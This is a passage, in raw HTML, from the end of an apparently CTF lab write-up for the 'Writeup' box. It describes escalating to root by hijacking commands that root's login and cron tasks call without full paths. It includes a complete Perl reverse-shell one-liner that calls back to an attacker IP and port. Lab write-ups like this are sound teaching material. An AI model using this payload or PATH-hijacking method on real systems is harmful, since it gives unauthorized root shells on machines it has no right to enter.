margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span><span class="c11 c10">&nbsp;&larr; after logging out and logging back in</span></p><p class="c3"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 608.00px; height: 114.00px;"><img alt="" src="images/image22.png" style="width: 608.00px; height: 114.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3"><span>Note that the user who created a binary in the </span><span class="c2">/usr/local/bin</span><span>&nbsp;path must logout and log back in for it to affect him. All other users on the box do not need to do that (I am not sure why). This means that in a real scenario, before the command is hijacked, a victim could run a</span><span class="c2">&nbsp;</span><span>command and it would work just as expected. After it gets hijacked, the victim could run that same command (during the same login session) and the hijacked binary would get executed instead! This is why for the sake of security, it is imperative that high-privileged users execute the full path of commands (especially when it comes to cron jobs). Let&rsquo;s look for cron jobs running as root. There might be one that is running a command without using its full path. There is a great script on github called </span><span class="c9"><a class="c7" href="https://www.google.com/url?q=https://github.com/DominicBreuker/pspy&amp;sa=D&amp;source=editors&amp;ust=1653884891185100&amp;usg=AOvVaw2w7-_BCyKSKMsXly3u3ToU">pspy</a></span><span>&nbsp;that actively monitors all processes running on a system. Downloading </span><span class="c2">pspy</span><span class="c1">&nbsp;and running it on the box, we see the following output:</span></p><p class="c3"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 32.00px;"><img alt="" src="images/image10.png" style="width: 624.00px; height: 32.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3"><span>When first doing this box, I noticed that whenever I put a binary in the </span><span class="c2">/usr/local/bin</span><span>&nbsp;path or the </span><span class="c2">/usr/local/sbin</span><span class="c1">&nbsp;path, it would keep getting removed after some time. This cronjob is probably the culprit. I went into this rabbit hole for a long time. I tried using symbolic links to delete files, but it did not work. This privesc was especially difficult for people hacking on private instances (such as myself) because watch what happens when a person logs into jkr:</span></p><p class="c3"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 85.33px;"><img alt="" src="images/image39.png" style="width: 624.00px; height: 85.33px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3"><span>Suddenly, we are met with a whole bunch of commands that don&rsquo;t use the full path. We have </span><span class="c2">sh</span><span>, </span><span class="c2">run-parts</span><span>, and </span><span class="c2">uname</span><span>. Each of these commands is run by UID=0 which is root. So if we put a reverse shell in one of these binaries and copy it to the </span><span class="c2">/usr/local/bin</span><span class="c1">&nbsp;path, it will get executed and we will have a shell! The bash reverse shell did not work for me, so I used the perl reverse shell:</span></p><p class="c3"><span class="c6 c2">perl -e &#39;use Socket;$i=&quot;10.10.14.5&quot;;$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;</span></p><p class="c3"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 108.00px;"><img alt="" src="images/image41.png" style="width: 624.00px; height: 108.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 602.00px; height: 198.00px;"><img alt="" src="images/image37.png" style="width: 602.00px; height: 198.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c3"><span>This was a fun box! Thank you </span><span class="c2">@jkr</span><span>&nbsp;for the cool privesc. Also, big thanks to </span><span class="c2">Daniele Scanu</span><span>, the creator of the SQL injection script. That was probably the most beautiful and user-friendly exploit I have ever used. Last but not least, thanks to you for reading this writeup! I hope you learned not only from the Writeup box, but also from this writeup! Feel free to write me up at </span><span class="c9"><a class="c7" href="mailto:0xd4yWriteups@gmail.com">0xd4yWriteups@gmail.com</a></span><span>&nbsp;if you have any comments!</span></p><p class="c3 c4"><span class="c1"></span></p><p class="c3 c4"><span class="c1"></span></p></body></html>